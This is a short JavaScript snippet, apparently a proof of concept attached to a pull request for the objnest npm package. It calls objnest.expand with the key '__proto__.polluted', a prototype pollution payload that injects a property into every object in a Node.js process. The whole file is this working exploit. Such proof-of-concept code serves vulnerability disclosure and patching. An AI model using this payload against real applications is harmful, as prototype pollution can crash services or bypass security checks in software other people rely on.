//https://github.com/okunishinishi/node-objnest/pull/6
 
  const objnest = require("objnest");

  let obj = {};
   

  objnest.expand({ "__proto__.polluted": "yes" });
// End of file
